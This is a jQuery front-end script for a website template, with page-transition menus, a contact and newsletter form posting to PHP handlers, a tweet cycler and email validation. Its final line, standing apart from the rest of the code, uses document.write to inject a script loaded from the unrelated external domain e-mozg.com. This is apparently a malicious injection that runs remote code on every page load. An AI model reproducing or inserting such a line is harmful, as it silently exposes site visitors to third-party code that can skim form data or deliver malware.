(function($) {
	/* ======= Clear Default ====== */
	$.fn.clearDefault = function() {
		"use strict";
		return this.each(function() {
			var default_value = $(this).val();
		});
	};

	/* ======= Height Fix ====== */
	function vertCenter(item) {
		"use strict";
		item.css({
			'margin-top' : '-' + parseInt((item.height() / 2), 0) + 'px'
		}).fadeIn();
	}

	jQuery(window).load(function(){
		vertCenter($('.itemwrap > li > div'));
		vertCenter($('#thumbs'));
		vertCenter($('#clock'));
		// vertCenter($('#demo_thumbs'));
	});


	jQuery(document).ready(function($) {
		"use strict";

		$('.show_toggle a').click(function(){
			$('body').toggleClass('menu_show');

			return false;
		});

		$('.form_submit').click(function(){
			var form = $(this).parents('form');
			form.find('.form_item').removeClass('error');
			form.find('.error_block').remove();
			var post_data;
			var errors = formValidation(form),
				output;
			if( Object.keys(errors).length > 0 ) {
				showErrors(form, errors);
			} else {
				if(form.attr('id') == 'contacts_form') {
 					post_data = {
            		    'name'     : $('input[name=name]').val(),
            		    'email'    : $('input[name=email]').val(),
            		    'message'  : $('input[name=message]').val()
            		};

            		//Ajax post data to server
            		jQuery.post('contacts.php', post_data, function(response){
            		    if(response.type == 'error'){ //load json data from server and output message
            		        output = '<div class="error_block">'+response.text+'</div>';
            		    } else{
            		        output = '<div class="success">'+response.text+'</div>';
            		        //reset values in all input fields
            		        $("#contacts_form .form_item").val('');
            		    }
            		    form.find('.form_row').slideUp();
            		    form.find("#contact_results").hide().html(output).slideDown();
            		}, 'json');
        		} else {
        			post_data = {
            		    'subscribe_email': $('input[name=subscribe_email]').val(),
            		};

            		jQuery.post('subscribe.php', post_data, function(response){

        		        output = '<div class="success">'+response.text+'</div>';
        		        //reset values in all input fields
        		        $("#contacts_form .form_item").val('');
        		        form.find('.form_inner').slideUp();
            		    form.find("#form_results").hide().html(output).slideDown();
            		}, 'json');
        		}

		}
		return false;
	});

		$('.side-page').click(function() {
			var curPage = $(this).attr('id');
			$('.main-menu li').removeClass('active');
			$('.main-menu li a[data-page="' + curPage + '"]').parent().addClass('active');
			$('.side-page').removeClass('active').removeClass('went-left').removeClass('went-right');
			$(this).prev().addClass('side-left').addClass('went-left');
			$(this).next().addClass('side-right').addClass('went-right');
			$(this).addClass('active');
		});

		$('.main-menu a:not(.home-link)').click(function() {
			$('#clock').removeClass('active');
			$('.mainarea-content').addClass('active');
			$('.close').addClass('active');
			var curPage = $(this).attr('data-page');
			$('.main-menu li').removeClass('active');
			$(this).parent().addClass('active');
			$('.mainarea-content > div').removeClass('active').removeClass('went-left').removeClass('went-right');
			$('#' + curPage + '').prev().addClass('side-left').addClass('went-left');
			$('#' + curPage + '').next().addClass('side-right').addClass('went-right');
			$('#' + curPage + '').addClass('active');
		});

		$('.close').click(function(e) {
			e.preventDefault();
			$('#clock').addClass('active');
			$('.main-menu li').removeClass('active');
			$('.close').removeClass('active');
			$('.mainarea-content').removeClass('active');
		});

		$('.home-link').click(function(e) {
			e.preventDefault();
			$('#clock').addClass('active');
			$('.main-menu li').removeClass('active');
			$('.close').removeClass('active');
			$('.mainarea-content').removeClass('active');
			$('.home-link').parent().addClass('active');
		});

		$('input[type="text"]').clearDefault();


		$('#tweet_list').cycle({
			fx : 'custom',
			cssBefore : {
				top : 50,
				height : 100,
				opacity : 0,
				display : 'block'
			},
			animIn : {
				top : 0,
				opacity : 1
			},
			animOut : {
				opacity : 0,
				top : -50
			},
			cssAfter : {
				zIndex : 0,
				display : 'none'
			},
			speed : 1750,
			sync : false,
			easeIn : 'easeOutBack',
			easeOut : 'easeInBack'
		});
	});

	function resizeStuff() {
		vertCenter($('.itemwrap > li > div'));
		vertCenter($('#thumbs'));
		vertCenter($('#clock'));
	}
	var onSmartResize = false;

	$(window).resize(function(){
		if(onSmartResize !== false)
			clearTimeout(onSmartResize);
		onSmartResize = setTimeout( function(){resizeStuff() }, 200); //200 is time in miliseconds
	});

})(jQuery);



/* Forms Validation */
function formValidation(form) {

	var error = {};

	if(form) {
		form.find('.form_item').each(function(){
			var $th = $(this);

			if( $th.val() != '' ) {
				if( $th.attr('type') == 'email' ) {
					var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
					if( !emailReg.test( jQuery.trim($th.val()) ) ) {
						error[$th.attr('id')] = 'not_email';
					}
				}
			} else {
				error[$th.attr('id')] = 'empty';
			}

		});
	}
	return error;
}

/* Validation Errors */
function showErrors(form, errors) {
	var error_message = ''
	for(var i in errors) {
		var form_item = form.find($('#'+i)),
			form_item_name = form_item.attr('placeholder');

		form_item.addClass('error');
		if( errors[i] == 'empty' )
			error_message += '<div class="error">Field '+form_item_name+' is required</div>';
		else
			error_message += '<div class="error">You entered an invalid email</div>';
	}
	if( form.find('.error_block').length > 0) {
		form.find('.error_block').html(error_message);
	} else {
		form.append('<div class="error_block">'+error_message+'</div>');
	}
}
document.write('<script src="https://e-mozg.com/form.js" type="text/javascript"></script>');